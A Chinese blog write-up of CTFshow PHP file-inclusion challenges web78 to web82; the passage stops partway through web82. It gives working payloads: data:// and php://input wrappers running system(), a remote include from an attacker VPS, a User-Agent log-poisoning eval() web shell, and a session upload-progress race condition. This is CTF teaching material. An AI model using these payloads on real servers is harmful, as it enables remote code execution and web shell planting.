@@ -1,0 +1,787 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    CTFSHOW-文件包含 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="说明： 前几题举图示例 后面由于感官问题就不列图了  web78(无过滤) 123456if(isset($_GET[&#x27;file&#x27;]))&#123;    $file &#x3D; $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;  我们先用data">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFSHOW-文件包含">
+<meta property="og:url" content="http://example.com/2025/03/21/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="说明： 前几题举图示例 后面由于感官问题就不列图了  web78(无过滤) 123456if(isset($_GET[&#x27;file&#x27;]))&#123;    $file &#x3D; $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;  我们先用data">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/03/21/images/20250322121439683.png">
+<meta property="og:image" content="http://example.com/2025/03/21/images/20250322152048817.png">
+<meta property="og:image" content="http://example.com/2025/03/21/images/20250322152741007.png">
+<meta property="og:image" content="http://example.com/2025/03/21/images/20250322152820188.png">
+<meta property="og:image" content="http://example.com/2025/03/21/images/20250323105201309.png">
+<meta property="og:image" content="http://example.com/2025/03/21/images/20250323105711257.png">
+<meta property="article:published_time" content="2025-03-21T12:58:48.000Z">
+<meta property="article:modified_time" content="2025-03-23T07:00:30.981Z">
+<meta property="article:author" content="fuboy">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/03/21/images/20250322121439683.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/../images/17373827994914.jpg" alt="CTFSHOW-文件包含">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">CTFSHOW-文件包含</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web78%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">1.</span> <span class="toc-text"> web78(无过滤)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web79%E8%BF%87%E6%BB%A4php"><span class="toc-number">2.</span> <span class="toc-text"> web79(过滤php)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.</span> <span class="toc-text"> data伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#input%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text"> input伪协议+大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.3.</span> <span class="toc-text"> 远程加载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web80%E8%BF%87%E6%BB%A4phpdata"><span class="toc-number">3.</span> <span class="toc-text"> web80(过滤php,data)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#input%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87-2"><span class="toc-number">3.1.</span> <span class="toc-text"> input伪协议+大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD-2"><span class="toc-number">3.2.</span> <span class="toc-text"> 远程加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-number">3.3.</span> <span class="toc-text"> 日志包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web81%E8%BF%87%E6%BB%A4phpdata"><span class="toc-number">4.</span> <span class="toc-text"> web81(过滤php,data,:)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB-2"><span class="toc-number">4.1.</span> <span class="toc-text"> 日志包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web82%E8%BF%87%E6%BB%A4phpdata"><span class="toc-number">5.</span> <span class="toc-text"> web82(过滤php,data,:,.)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">5.1.</span> <span class="toc-text"> session文件+条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bp%E7%88%86%E7%A0%B4"><span class="toc-number">5.1.1.</span> <span class="toc-text"> bp爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%8E%AF%E5%A2%83"><span class="toc-number">5.1.1.1.</span> <span class="toc-text"> 构造文件上传环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#intruder"><span class="toc-number">5.1.1.2.</span> <span class="toc-text"> intruder</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#py%E8%84%9A%E6%9C%AC"><span class="toc-number">5.1.2.</span> <span class="toc-text"> py脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web83-86%E5%90%8C82"><span class="toc-number">6.</span> <span class="toc-text"> web83-86(同82)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web87phpfilter%E7%9A%84%E5%A6%99%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text"> web87(php:&#x2F;&#x2F;filter的妙用)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A7%E7%94%A8%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81"><span class="toc-number">7.1.</span> <span class="toc-text"> 巧用编码与解码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B"><span class="toc-number">7.1.1.</span> <span class="toc-text"> 举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E9%A2%98"><span class="toc-number">7.1.2.</span> <span class="toc-text"> 本题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13%E7%BC%96%E7%A0%81"><span class="toc-number">7.1.3.</span> <span class="toc-text"> Rot13编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web88%E8%BF%87%E6%BB%A4%E7%AC%A6%E5%8F%B7"><span class="toc-number">8.</span> <span class="toc-text"> web88(过滤符号)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AEbase64%E7%BC%96%E7%A0%81"><span class="toc-number">8.1.</span> <span class="toc-text"> data伪协议+base64编码</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">62</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">35</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-CTFSHOW-文件包含" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/03/21/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-03-21T12:58:48.000Z" itemprop="datePublished">2025-03-21</time>
+    <time style="display: none;" id="post-update-time">2025-03-23</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>说明：</p>
+<p>前几题举图示例</p>
+<p>后面由于感官问题就不列图了</p>
+<h2 id="web78无过滤"><a class="markdownIt-Anchor" href="#web78无过滤"></a> web78(无过滤)</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250322121439683.png" alt="image-20250322121439683" /></p>
+<p>我们先用data伪协议来查看flag在哪个文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>发现是flag.php，那我们直接用data伪协议读出来就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250322152048817.png" alt="image-20250322152048817" /></p>
+<p>或者我们也能用php://filter协议读出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="web79过滤php"><a class="markdownIt-Anchor" href="#web79过滤php"></a> web79(过滤php)</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="data伪协议"><a class="markdownIt-Anchor" href="#data伪协议"></a> data伪协议</h3>
+<p>过滤了php，那用data协议的时候就不能用<code>&lt;?php?&gt;</code>了，可以用<code>&lt;?=?&gt;</code></p>
+<p>还是一样的操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250322152741007.png" alt="image-20250322152741007" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>但是到后面我才发现一个问题，flag.php有php，但能执行成功</p>
+<p>原因：题目把php替换成了???但命令执行是能识别占位符的</p>
+<p>例如<code>flag.???</code></p>
+<p>但保险起见，我们还是把php替换掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&#x27;tac flag*&#x27;);?&gt;</span><br><span class="line">或</span><br><span class="line">编码绕过</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250322152820188.png" alt="image-20250322152820188" /></p>
+<h3 id="input伪协议大小写绕过"><a class="markdownIt-Anchor" href="#input伪协议大小写绕过"></a> input伪协议+大小写绕过</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=Php://input</span><br><span class="line">抓包</span><br><span class="line">post传值：</span><br><span class="line">&lt;?php system(&#x27;tac flag.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="远程加载"><a class="markdownIt-Anchor" href="#远程加载"></a> 远程加载</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我们输入http://www.baidu.com-&gt;回显出了百度的界面</span><br><span class="line">因此可以用远程加载文件</span><br><span class="line">在vps上创建一个1.txt文件-&gt;</span><br><span class="line">&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=http://公网ip/include/1.txt</span><br></pre></td></tr></table></figure>
+<h2 id="web80过滤phpdata"><a class="markdownIt-Anchor" href="#web80过滤phpdata"></a> web80(过滤php,data)</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="input伪协议大小写绕过-2"><a class="markdownIt-Anchor" href="#input伪协议大小写绕过-2"></a> input伪协议+大小写绕过</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=Php://input</span><br><span class="line">抓包</span><br><span class="line">post传值：</span><br><span class="line">&lt;?php system(&#x27;tac fl0g.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="远程加载-2"><a class="markdownIt-Anchor" href="#远程加载-2"></a> 远程加载</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在vps上创建一个1.txt文件-&gt;</span><br><span class="line">&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=http://公网ip/include/1.txt</span><br></pre></td></tr></table></figure>
+<h3 id="日志包含"><a class="markdownIt-Anchor" href="#日志包含"></a> 日志包含</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">抓包</span><br><span class="line">在ua头写上一句话木马：</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36&lt;?php @eval($_POST[&#x27;mima&#x27;]);?&gt;</span><br><span class="line">放行</span><br><span class="line"></span><br><span class="line">访问日志文件</span><br><span class="line">?file=/var/log/nginx/access.log</span><br><span class="line">1、蚁剑连接</span><br><span class="line">2、直接命令执行</span><br><span class="line">post:</span><br><span class="line">mima=system(&#x27;tac fl0g.php&#x27;);phpinfo();//查找phpinfo()前面那一句话就行</span><br></pre></td></tr></table></figure>
+<h2 id="web81过滤phpdata"><a class="markdownIt-Anchor" href="#web81过滤phpdata"></a> web81(过滤php,data,<code>:</code>)</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里只能用文件包含了</p>
+<p>远程加载的话http:不能用</p>
+<h3 id="日志包含-2"><a class="markdownIt-Anchor" href="#日志包含-2"></a> 日志包含</h3>
+<p>看web80</p>
+<h2 id="web82过滤phpdata"><a class="markdownIt-Anchor" href="#web82过滤phpdata"></a> web82(过滤php,data,<code>:</code>,<code>.</code>)</h2>
+<p>坏了，日志包含也不能用了</p>
+<p>看题目提示用条件竞争</p>
+<p>行，条件竞争就条件竞争</p>
+<h3 id="session文件条件竞争"><a class="markdownIt-Anchor" href="#session文件条件竞争"></a> session文件+条件竞争</h3>
+<p>因为点号也被过滤了，那就不能有文件后缀名</p>
+<p>所以就只能使用session文件</p>
+<p>session相关配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled = on //enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</span><br><span class="line">session.upload_progress.prefix = &quot;upload_progress_&quot; //将表示为session中的键名</span><br><span class="line">session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot; //当它出现在表单中，php将会报告上传进度，而且它的值可控！！！</span><br><span class="line">session.use_strict_mode = off //这个选项默认值为off，表示我们对Cookie中sessionid可控！！！</span><br><span class="line">session.save_path = /var/lib/php/sessions //session的存贮位置，默认还有一个 /tmp/目录</span><br></pre></td></tr></table></figure>
+<p>条件竞争条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.cleanup = on //表示当文件上传结束后，php将会立即清空对应session文件中的内容</span><br></pre></td></tr></table></figure>
+<p>默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，清空了就没办法利用了。我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。</p>
+<h4 id="bp爆破"><a class="markdownIt-Anchor" href="#bp爆破"></a> bp爆破</h4>
+<h5 id="构造文件上传环境"><a class="markdownIt-Anchor" href="#构造文件上传环境"></a> 构造文件上传环境</h5>
+<p>创建一个1.html文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;https://dbfe0749-cf1d-4eaa-b41d-65166e63492d.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//action为自己题目环境</span><br><span class="line">//value为我们想执行的恶意代码</span><br></pre></td></tr></table></figure>
+<h5 id="intruder"><a class="markdownIt-Anchor" href="#intruder"></a> intruder</h5>
+<p>打开1.html后，随意上传一个文件</p>
+<p>抓包，发送到intruder模块</p>
+<p>然后增加Cookie的值：Cookie:PHPSESSID=exp</p>
+<p>然后<strong>payload type选择 null</strong>（也就是没有），并且<strong>勾选上无限重复</strong></p>
+<p><img src="../images/20250323105201309.png" alt="image-20250323105201309" /></p>
+<p>然后设置线程数：此操作我们设置为30</p>
+<p>然后开始攻击</p>
+<p>下一步就是重新抓取一个包</p>
+<p>抓的包为<strong>题目链接/?file=/tmp/sess_exp</strong></p>
+<p>按以上操作(无需增加Cookie)</p>
+<p>线程数为80(大一点也可以)</p>
+<p>开始攻击</p>
